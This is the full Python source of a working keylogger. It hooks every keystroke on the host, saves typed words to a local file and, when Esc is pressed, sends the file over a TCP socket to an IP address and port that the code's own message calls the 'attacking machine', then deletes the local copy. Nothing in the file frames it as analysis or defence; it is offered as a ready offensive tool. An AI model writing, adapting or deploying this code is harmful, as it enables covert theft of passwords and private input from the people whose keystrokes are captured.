#!/usr/bin/env python3

## -- Simple and lightweight keylogger to send keystrokes via socket -- ##

from colorama import Fore, Style
import argparse
import keyboard
import socket
import sys
import os


# colors
green = Fore.GREEN
reset = Style.RESET_ALL

word = ""

def reset_word():
    global word
    word = ""

def save_word():
    with open("output.txt", "a") as file:
        file.write(word + "\n")
    print(f'Word saved: {green}{word}{reset}')
    reset_word()

def press_key(keystroke):
    global word

    if keystroke.event_type == keyboard.KEY_DOWN:
        if keystroke.name == 'space':
            save_word()
        elif len(keystroke.name) == 1 and keystroke.name.isprintable():
            word += keystroke.name

keyboard.hook(press_key)

def send_file_via_sockets(file, ip_address, port):
    try:
        with open(file ,'rb') as file:
            content = file.read()

        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((ip_address, port))
            s.sendall(content)
            os.remove("output.txt")
            sys.exit()

    except Exception as e:
        print(f'Error to send file: {e}')


def stop_script(ip_address, port,  file):
    print(f'{green}[*] Sending file to attacking machine...{reset}')
    keyboard.unhook_all()
    send_file_via_sockets(file, ip_address, port)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simple and Ligthweight keylogger in Python.')
    parser.add_argument('ip', type=str, help='Destination IP Address')
    parser.add_argument('port', type=int, help='Destination port')
    args = parser.parse_args()

    destination_ip_address = args.ip
    destination_port = args.port
    file_to_send = 'output.txt'

    try:
        keyboard.wait('esc')
        stop_script(destination_ip_address, destination_port, file_to_send)
    except KeyboardInterrupt:
        print(f'{green}\n[*] Keylogger stopped{reset}')
        pass